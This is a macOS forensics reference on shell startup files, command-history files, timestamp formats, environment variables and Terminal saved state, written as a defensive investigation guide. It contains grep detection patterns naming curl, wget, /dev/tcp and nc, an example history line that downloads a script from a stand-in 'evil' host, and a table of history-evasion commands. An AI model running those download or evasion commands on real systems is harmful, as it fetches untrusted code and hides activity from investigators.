# Shells and Command History

Recovering and interpreting shell activity: which shell ran, its startup/config files (also persistence vectors), command-history files and their timestamp formats, environment variables, and where commands survive even after history is cleared. **Default shell = `zsh` since Catalina (10.15)**; `bash` (stuck at GPLv2-era **3.2**) was default on **10.14 and earlier** and still ships at `/bin/bash`.

## Contents
- [Quick Triage](#quick-triage)
- [Which Shell Ran?](#which-shell-ran)
- [Startup / Config Files (load order)](#startup--config-files-load-order)
- [Command History Files](#command-history-files)
- [History Timestamp Formats](#history-timestamp-formats)
- [Environment Variables](#environment-variables)
- [Other Interpreter & Tool Histories](#other-interpreter--tool-histories)
- [Terminal App Artifacts (history survives a clear here)](#terminal-app-artifacts-history-survives-a-clear-here)
- [Anti-Forensics / History Evasion](#anti-forensics--history-evasion)
- [Corroborating Logs](#corroborating-logs)
- [Red Flags](#red-flags)

---

## Quick Triage

```bash
# --- HISTORY TAMPERING: zero-byte or symlinked history files ---
ls -la /Users/*/.bash_history /Users/*/.zsh_history 2>/dev/null

find /Users -maxdepth 2 \( -name .bash_history -o -name .zsh_history \) \
     \( -size 0 -o -type l \) 2>/dev/null

# --- PERSISTENCE / EXECUTION in shell startup files ---
grep -rEni 'curl|wget|base64|eval|/dev/tcp|nc |ncat|python[0-9]? -c|osascript|DYLD_INSERT|launchctl' \
  /Users/*/.zshenv /Users/*/.zshrc /Users/*/.zprofile /Users/*/.zlogin \
  /Users/*/.bash_profile /Users/*/.bashrc /Users/*/.profile \
  /etc/zprofile /etc/zshrc /etc/profile /etc/bashrc 2>/dev/null

# --- PATH HIJACK in rc files ---
grep -rEn 'PATH=.*(^|:)(\.|/tmp|/Users/[^/]+/(Public|Shared))' /Users/*/.z* /Users/*/.bash* 2>/dev/null

# --- SUSPICIOUS COMMANDS across ALL history (incl. session histories) ---
grep -hERi 'curl|wget|base64 -d|chmod \+x|\bnc\b|/dev/tcp|ssh |scp |osascript|launchctl (load|bootstrap)|sudo |csrutil disable' \
  /Users/*/.zsh_history /Users/*/.bash_history \
  /Users/*/.zsh_sessions /Users/*/.bash_sessions 2>/dev/null

# --- ALL the secondary stashes (often missed) ---
ls -la /Users/*/.zsh_sessions /Users/*/.bash_sessions 2>/dev/null

ls -la /Users/*/.python_history /Users/*/.sqlite_history /Users/*/.viminfo /Users/*/.lesshst 2>/dev/null

# --- RECOVER cleared activity from Terminal/iTerm scrollback ---
ls -la /Users/*/Library/Saved\ Application\ State/com.apple.Terminal.savedState/ 2>/dev/null

# --- SSH lateral-movement targets ---
cat /Users/*/.ssh/known_hosts 2>/dev/null; cat /Users/*/.ssh/config 2>/dev/null
```

---

## Which Shell Ran?

| Source | How |
|---|---|
| Per-user shell (dead-box) | `UserShell` key in `/var/db/dslocal/nodes/Default/users/<u>.plist` |
| Per-user shell (live) | `dscl . -read /Users/<u> UserShell` |
| Allowed shells | `/etc/shells` |
| Current session (live) | `echo $SHELL` (login shell) · `echo $0` (running shell) |
| Default for new users | `/var/db/dslocal/.../<u>.plist`; macOS default `/bin/zsh` |

> `chsh -s /bin/bash <u>` changes a user's shell (logged in the unified log). A mismatch between `UserShell` and which history files exist is itself a clue (e.g. user "on bash" but only `~/.zsh_history` present).

---

## Startup / Config Files (load order)

macOS **Terminal opens a login + interactive shell**, so login *and* interactive files are sourced. These files are prime **persistence** spots — anything here runs at shell start.

### Zsh (loaded top→bottom; `/etc` system file before the `~` user file)

| Order | File | When | Note |
|---|---|---|---|
| 1 | `/etc/zshenv`, `~/.zshenv` | 🔴 **Every** zsh invocation (incl. scripts, non-interactive) | Strongest persistence — always runs |
| 2 | `/etc/zprofile`, `~/.zprofile` | Login shells | macOS `/etc/zprofile` runs `path_helper` (builds PATH) |
| 3 | `/etc/zshrc`, `~/.zshrc` | Interactive shells | Most common user customization |
| 4 | `/etc/zlogin`, `~/.zlogin` | Login shells (after zshrc) | |
| 5 | `~/.zlogout`, `/etc/zlogout` | Login **logout** | |

### Bash

| File | When | Note |
|---|---|---|
| `/etc/profile` | Login | macOS version sources `/etc/bashrc` + runs `path_helper` |
| `~/.bash_profile` → else `~/.bash_login` → else `~/.profile` | Login (first found only) | |
| `/etc/bashrc`, `~/.bashrc` | Non-login interactive | Convention: `.bash_profile` sources `.bashrc` |
| `~/.bash_logout` | Login logout | |

🔴 **Check these files for:** appended `curl … | bash`, `eval`, reverse-shell one-liners, `alias`/`function` overrides, `PATH` prepends, and `DYLD_INSERT_LIBRARIES`/`HISTFILE` tampering. `~/.zshenv` is the highest-value persistence file because it runs even for non-interactive zsh.

> ℹ️ **These config files are NOT SIP-protected** — neither the global `/etc/zprofile`·`/etc/zshrc` (on `/private/etc`, Data volume) nor any `~/.zsh*`/`~/.bash*`. Only the shell **binary** (`/bin/zsh`, `/usr/share/zsh`) carries the `restricted` flag. That's precisely why these files work as persistence.

### PATH construction

`path_helper` builds PATH from `/etc/paths` and the files in `/etc/paths.d/` — check both for attacker-added directories.

---

## Command History Files

| Shell | File | In-memory count | On-disk count |
|---|---|---|---|
| zsh | 🔴 `~/.zsh_history` | `HISTSIZE` | `SAVEHIST` |
| bash | 🔴 `~/.bash_history` | `HISTSIZE` | `HISTFILESIZE` |

Controlled by (set in rc files / env):

| Variable / setopt | Effect | Forensic angle |
|---|---|---|
| `HISTFILE` | Path of history file | Set to `/dev/null` or unset = **evasion** |
| `HISTSIZE` / `SAVEHIST` = 0 | Keep nothing | **Evasion** |
| bash `HISTCONTROL=ignorespace`/`ignoredups` | Skip space-prefixed/dup commands | Space-prefixed commands **not** recorded |
| zsh `HIST_IGNORE_SPACE` | Same (leading-space) | Same caveat |
| bash `HISTTIMEFORMAT` | Enables per-command timestamps | If unset, **no timestamps** in bash |
| zsh `EXTENDED_HISTORY` (setopt) | Adds epoch+duration to each entry | Default off on stock macOS |
| zsh `INC_APPEND_HISTORY` / `SHARE_HISTORY` | Write immediately vs on exit | If off, history flushed only at clean exit |
| bash `shopt histappend` | Append vs overwrite on exit | |

> ⚠️ **Absence is not proof.** History is normally flushed only on **clean exit**; a `kill -9`'d or crashed shell loses unwritten in-memory commands. Space-prefixed commands and `HISTIGNORE` matches never land on disk.

### macOS per-session history (the overlooked goldmine)

macOS Terminal's "resume" feature writes **per-session** history that survives even when the main `~/.zsh_history`/`~/.bash_history` is cleared:

| Path | Shell | Contains |
|---|---|---|
| 🔴 `~/.zsh_sessions/<UUID>.history` | zsh | Per-window command history for each saved session |
| 🔴 `~/.bash_sessions/<UUID>.history` / `.historynew` | bash | Same, per session UUID |
| `~/.zsh_sessions/<UUID>.session` / `.bash_sessions/<UUID>.session` | both | Session restore state |

> These are driven by `SHELL_SESSIONS_DISABLE` / `SHELL_SESSION_HISTORY`. 🔴 **Always pull `~/.zsh_sessions` and `~/.bash_sessions`** — they frequently retain commands that were wiped from the primary history file, and the UUIDs/mtimes help reconstruct distinct terminal sessions.

---

## History Timestamp Formats

**Bash** (only if `HISTTIMEFORMAT` was set) — a comment line with epoch precedes each command:
```
#1719683400
sudo whoami
```

**Zsh `EXTENDED_HISTORY`** — `: <start-epoch>:<elapsed-seconds>;<command>`:
```
: 1719683400:0;curl http://evil/x.sh -o /tmp/x.sh
```
Plain zsh history (no extended) = bare command lines, **no timestamps**.

```bash
# Decode zsh extended-history timestamps
awk -F'[:;]' '/^: /{cmd=substr($0,index($0,";")+1); print strftime("%F %T",$2), cmd}' ~/.zsh_history
```

> Cross-corroborate history timing with the **unified log**, **Terminal saved state** (§6), and file mtimes — history timestamps are user-controllable and easily absent.

---

## Environment Variables

| Variable | Tells you | Forensic angle |
|---|---|---|
| 🔴 `PATH` | Command search order | Prepended `.`, `/tmp`, or user dir = **binary hijack** |
| `HOME` / `USER` / `LOGNAME` | Identity | Attribution |
| `SHELL` | Login shell | |
| 🔴 `SSH_CLIENT` / `SSH_CONNECTION` / `SSH_TTY` | Set in **remote SSH** sessions; contain client **IP/port** | Proves remote origin + source address |
| `TMPDIR` | Per-user temp → `/var/folders/<…>/T/` | Where scratch/temp artifacts land |
| `HISTFILE`/`HISTSIZE`/`SAVEHIST` | History config | Zeroed/redirected = evasion |
| `TERM_PROGRAM` | `Apple_Terminal` / `iTerm.app` / `vscode` | Which terminal app was used |
| `__CF_USER_TEXT_ENCODING` | Encodes the **UID** | User attribution |
| 🔴 `DYLD_INSERT_LIBRARIES` / `DYLD_*` | Forces dylib load into processes | **Injection / persistence** (LD_PRELOAD analogue) |
| `VISUAL` / `EDITOR` | Default editor | Minor context |

**Where env vars persist:**

| Mechanism | Scope |
|---|---|
| `~/.zshenv`, `~/.zprofile`, `~/.bash_profile`, `/etc/profile` | Per shell start |
| `launchctl setenv NAME val` | Live session GUI/launchd (not reboot-persistent unless re-run) |
| LaunchAgent/Daemon plist `EnvironmentVariables` key | 🔴 Persistent across reboot |
| `/etc/launchd.conf` | Legacy/removed on modern macOS |

---

## Other Interpreter & Tool Histories

Often forgotten — attackers' tooling leaks here even when shell history is clean:

| File | From |
|---|---|
| `~/.python_history` | Python REPL |
| `~/.node_repl_history` | Node REPL |
| `~/.sqlite_history` | `sqlite3` |
| `~/.mysql_history` / `~/.psql_history` | MySQL / PostgreSQL clients |
| `~/.irb_history` / `~/.rediscli_history` | Ruby IRB / redis-cli |
| 🔴 `~/.viminfo` | Vim: command/search history, **recently edited files**, marks, registers |
| `~/.lesshst` | `less` search/command history |
| `~/.wget-hsts` | `wget` host history (proves wget use + hosts) |
| 🔴 `~/.ssh/known_hosts` + `~/.ssh/config` | SSH **lateral-movement targets** |

---

## Terminal App Artifacts (history survives a clear here)

| Artifact | Contains | DFIR meaning |
|---|---|---|
| 🔴 `~/Library/Saved Application State/com.apple.Terminal.savedState/` | `windows.plist` + `data.data` — last session **window contents / scrollback** | Recover typed commands **and their output** even if `~/.zsh_history` was wiped |
| `~/Library/Preferences/com.apple.Terminal.plist` | Window/profile settings, default shell command | Configured profiles; auto-run commands |
| `~/Library/Preferences/com.googlecode.iterm2.plist` + `~/Library/Application Support/iTerm2/` | iTerm2 config, scrollback, saved state | Same recovery angle for iTerm2 users |

> The **Terminal saved state** is the sleeper artifact: scrollback text persists regardless of `history -c`. Always pull it.

---

## Anti-Forensics / History Evasion

| Technique | What to look for |
|---|---|
| `unset HISTFILE` / `HISTFILE=/dev/null` | In rc files or as a session command |
| `HISTSIZE=0` / `SAVEHIST=0` | Zeroed history sizes |
| `export HISTCONTROL=ignorespace` then space-prefixed commands | Leading-space commands missing |
| `history -c` / `history -w` | Cleared in-session |
| `ln -s /dev/null ~/.bash_history` | History file is a **symlink** |
| `set +o history` / `unsetopt INC_APPEND_HISTORY` | History disabled mid-session |
| `kill -9 $$` / `rm ~/.zsh_history` | No flush / file deleted |

**Detect:** zero-byte or symlinked history file; rc files containing the above; history-file mtime that doesn't match login times; and recover the real activity from **Terminal saved state**, the **unified log**, and **sudo** records.

---

## Corroborating Logs

```bash
log show --predicate 'process == "sudo"' --info --last 7d           # sudo usage + commands

log show --predicate 'process == "ssh" OR process == "sshd"' --last 7d   # SSH sessions

log show --predicate 'process == "login" OR process == "loginwindow"' --last 7d

last                                                                 # tty/console login history
```

---

## Red Flags

| 🔴 Finding | Likely meaning |
|---|---|
| `~/.bash_history`/`~/.zsh_history` zero-byte or symlink to `/dev/null` | Deliberate history evasion |
| `HISTFILE`/`HISTSIZE` tampering in rc files | Anti-forensics |
| `curl\|bash`, reverse-shell, or `eval` lines in `~/.zshenv`/`.zshrc`/`.bash_profile` | Persistence / execution |
| `PATH` prepended with `.`, `/tmp`, user dir | Binary hijack |
| `DYLD_INSERT_LIBRARIES` set in rc or LaunchAgent | Dylib injection |
| History shows `curl`/`wget` to odd hosts, `chmod +x`, `sudo`, `ssh` to new hosts | Tooling, escalation, lateral movement |
| Commands in **Terminal saved state** or `~/.zsh_sessions` absent from main history | History was selectively cleared |
| SSH session env (`SSH_CONNECTION`) with unexpected source IP | Remote intrusion origin |
| `csrutil disable` / `spctl --master-disable` in history | SIP / Gatekeeper takedown |
